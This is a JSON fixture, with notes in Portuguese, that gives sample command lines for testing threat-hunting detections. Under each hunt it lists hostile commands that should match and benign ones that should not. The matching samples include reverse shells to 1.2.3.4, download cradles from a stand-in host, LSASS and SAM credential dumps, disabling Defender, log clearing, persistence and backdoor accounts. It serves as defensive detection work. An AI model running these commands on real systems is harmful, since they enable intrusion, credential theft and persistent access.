@@ -1,0 +1,289 @@
+{
+  "_leia-me": "Amostras de linha de comando para `python scripts/kb.py test`. Cada hunt lista o que DEVE casar (\"casa\") e o que NÃO deve (\"nao_casa\"). Texto puro vale como processCmd; use um objeto {\"processCmd\": ..., \"parentCmd\": ...} quando o hunt filtra outra coluna. Os filtros de tempo e eventCategory são ignorados; só entram os where sobre as colunas da amostra.",
+  "PowerShell codificado (-enc)": {
+    "casa": [
+      "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A",
+      "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
+      "POWERSHELL.EXE -ec \"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA\""
+    ],
+    "nao_casa": [
+      "powershell -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1",
+      "powershell -ErrorAction SilentlyContinue Get-Process"
+    ]
+  },
+  "PowerShell download cradle": {
+    "casa": [
+      "powershell iex (new-object net.webclient).downloadstring('http://x/a')",
+      "powershell IWR http://x/a.exe -OutFile a.exe"
+    ],
+    "nao_casa": [
+      "powershell Get-Date"
+    ]
+  },
+  "LOLBins (binários confiáveis abusados)": {
+    "casa": [
+      "CertUtil.exe -urlcache -f http://x/a.exe a.exe",
+      "MSHTA http://x/a.hta"
+    ],
+    "nao_casa": [
+      "notepad.exe a.txt"
+    ]
+  },
+  "Abuso de WMI": {
+    "casa": [
+      "WMIC process call create calc.exe",
+      "Invoke-CimMethod -ClassName Win32_Process -MethodName Create"
+    ],
+    "nao_casa": [
+      "wmiapsrv.exe"
+    ]
+  },
+  "Script rodando de pasta temporária": {
+    "casa": [
+      "wscript.exe C:\\Users\\ana\\AppData\\Local\\Temp\\run.VBS",
+      "cmd /c %TEMP%\\stage.bat",
+      "powershell -File C:\\Users\\Public\\x.ps1"
+    ],
+    "nao_casa": [
+      "powershell -File C:\\Scripts\\x.ps1",
+      "node C:\\Users\\ana\\AppData\\Roaming\\npm\\config.json"
+    ]
+  },
+  "Limpeza de logs de evento": {
+    "casa": [
+      "WEVTUTIL cl Security",
+      "powershell Clear-EventLog -LogName Security"
+    ],
+    "nao_casa": [
+      "wevtutil qe Security /c:5"
+    ]
+  },
+  "mshta executando script remoto": {
+    "casa": [
+      "mshta JavaScript:a=GetObject('script:http://x/a.sct').Exec();close()",
+      "mshta.exe C:\\x\\a.HTA"
+    ],
+    "nao_casa": [
+      "mshta.exe"
+    ]
+  },
+  "rundll32 suspeito": {
+    "casa": [
+      "rundll32.exe URL.dll,FileProtocolHandler http://x",
+      "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\""
+    ],
+    "nao_casa": [
+      "rundll32.exe C:\\Windows\\System32\\printui.dll,PrintUIEntry"
+    ]
+  },
+  "regsvr32 scriptlet (Squiblydoo)": {
+    "casa": [
+      "regsvr32 /s /n /u /I:http://x/a.sct scrobj.dll"
+    ],
+    "nao_casa": [
+      "regsvr32 /s C:\\app\\component.dll"
+    ]
+  },
+  "WScript/CScript rodando script": {
+    "casa": [
+      "WScript.exe C:\\x\\a.VBS",
+      "cscript //nologo run.js arg"
+    ],
+    "nao_casa": [
+      "cscript //nologo config.json"
+    ]
+  },
+  "bitsadmin transferindo arquivo": {
+    "casa": [
+      "bitsadmin /Transfer job http://x/a.exe C:\\a.exe"
+    ],
+    "nao_casa": [
+      "bitsadmin /list"
+    ]
+  },
+  "Ocultar arquivos (attrib +h +s)": {
+    "casa": [
+      "attrib +H +S C:\\x\\payload.exe"
+    ],
+    "nao_casa": [
+      "attrib -r C:\\x\\a.txt"
+    ]
+  },
+  "Reg desabilitando Defender/Tamper": {
+    "casa": [
+      "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v disableantispyware /t REG_DWORD /d 1 /f"
+    ],
+    "nao_casa": [
+      "reg add HKCU\\Software\\App /v Theme /d dark"
+    ]
+  },
+  "Acesso ao LSASS (dump de credencial)": {
+    "casa": [
+      "procdump.exe -ma LSASS.exe out.dmp"
+    ],
+    "nao_casa": [
+      "svchost.exe -k netsvcs"
+    ]
+  },
+  "Dump do SAM/SYSTEM via reg save": {
+    "casa": [
+      "reg save HKLM\\SAM C:\\temp\\sam",
+      "reg.exe save \"hklm\\system\" s.hiv",
+      "REG EXPORT HKEY_LOCAL_MACHINE\\SECURITY sec.reg"
+    ],
+    "nao_casa": [
+      "regsvr32 /s C:\\Windows\\System32\\x.dll",
+      "reg query HKLM\\SYSTEM\\CurrentControlSet"
+    ]
+  },
+  "Habilitar WDigest (creds em claro)": {
+    "casa": [
+      "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\wdigest /v uselogoncredential /d 1"
+    ],
+    "nao_casa": [
+      "reg add HKCU\\Software\\App /v x /d 1"
+    ]
+  },
+  "Persistência via Registry Run": {
+    "casa": [
+      "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\x\\a.exe",
+      "powershell New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name x -Value y"
+    ],
+    "nao_casa": [
+      "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "cmd /c run_backup.bat"
+    ]
+  },
+  "Tarefa agendada / serviço novo": {
+    "casa": [
+      "SCHTASKS /Create /SC ONLOGON /TN upd /TR C:\\x\\a.exe",
+      "sc.exe create evil binPath= C:\\x\\a.exe",
+      "sc \\\\srv01 create evil binpath= C:\\x\\a.exe",
+      "powershell Register-ScheduledTask -TaskName upd"
+    ],
+    "nao_casa": [
+      "schtasks /query /fo LIST",
+      "sc query WinDefend"
+    ]
+  },
+  "Criação de conta / grupo admin": {
+    "casa": [
+      "net user hacker P@ssw0rd /add",
+      "NET.EXE localgroup Administrators hacker /add",
+      "net1 user svc Pass1 /ADD",
+      "net group \"Domain Admins\" evil /add /domain",
+      "powershell Add-LocalGroupMember -Group Administradores -Member evil"
+    ],
+    "nao_casa": [
+      "net user bob",
+      "net group /domain",
+      "net localgroup users"
+    ]
+  },
+  "Assinatura de evento WMI (persistência)": {
+    "casa": [
+      "powershell Set-WmiInstance -Class __eventfilter -Namespace root\\subscription"
+    ],
+    "nao_casa": [
+      "powershell Get-WmiObject Win32_OperatingSystem"
+    ]
+  },
+  "Drop na pasta Startup": {
+    "casa": [
+      "copy a.lnk \"C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.LNK\""
+    ],
+    "nao_casa": [
+      "powershell Set-Service -Name x -StartupType Automatic; start C:\\x\\a.exe"
+    ]
+  },
+  "Winlogon/Userinit alterado": {
+    "casa": [
+      "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d C:\\x\\a.exe"
+    ],
+    "nao_casa": [
+      "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
+    ]
+  },
+  "Accessibility features (sethc/utilman)": {
+    "casa": [
+      "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Sethc.exe"
+    ],
+    "nao_casa": [
+      "rundll32 desk.cpl,InstallScreenSaver"
+    ]
+  },
+  "Reconhecimento (discovery)": {
+    "casa": [
+      "WHOAMI /all",
+      "net  view \\\\srv01",
+      "IPCONFIG /ALL"
+    ],
+    "nao_casa": [
+      "ipconfig",
+      "net start"
+    ]
+  },
+  "Cópia para share administrativo": {
+    "casa": [
+      "copy a.exe \\\\srv01\\C$\\Windows\\Temp\\a.exe",
+      "robocopy C:\\x \\\\srv02\\ADMIN$ a.exe",
+      "xcopy y \\\\10.0.0.5\\d$\\data"
+    ],
+    "nao_casa": [
+      "copy a.txt b.txt",
+      "move C:\\x\\a.log D:\\logs\\"
+    ]
+  },
+  "Staging em pasta temporária": {
+    "casa": [
+      "copy C:\\dados\\*.xlsx C:\\$Recycle.Bin\\x",
+      "robocopy C:\\dados %TEMP%\\out"
+    ],
+    "nao_casa": [
+      "copy relatorio.docx D:\\backup\\"
+    ]
+  },
+  "Indícios de nota de resgate": {
+    "casa": [
+      "notepad C:\\Users\\ana\\Desktop\\README_DECRYPT.txt"
+    ],
+    "nao_casa": [
+      "notepad C:\\notas\\reuniao.txt"
+    ]
+  },
+  "Reverse shell (one-liner)": {
+    "casa": [
+      "C:\\tools\\nc.exe -e cmd.exe 1.2.3.4 4444",
+      "ncat 1.2.3.4 443 -e /bin/sh",
+      "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+      "powershell $c=New-Object System.Net.Sockets.TCPClient('1.2.3.4',443)"
+    ],
+    "nao_casa": [
+      "powershell [string]::Concat('a','b')",
+      "C:\\Program Files\\x\\sync.exe --all",
+      "concat file1 file2"
+    ]
+  },
+  "Servidor web ou SQL gerando shell (webshell)": {
+    "casa": [
+      {
+        "parentCmd": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+        "processCmd": "cmd.exe /c whoami"
+      },
+      {
+        "parentCmd": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL15\\Binn\\sqlservr.exe\" -sMSSQLSERVER",
+        "processCmd": "powershell -c iwr http://x"
+      }
+    ],
+    "nao_casa": [
+      {
+        "parentCmd": "C:\\Windows\\explorer.exe",
+        "processCmd": "cmd.exe"
+      },
+      {
+        "parentCmd": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+        "processCmd": "csc.exe /noconfig"
+      }
+    ]
+  }
+}
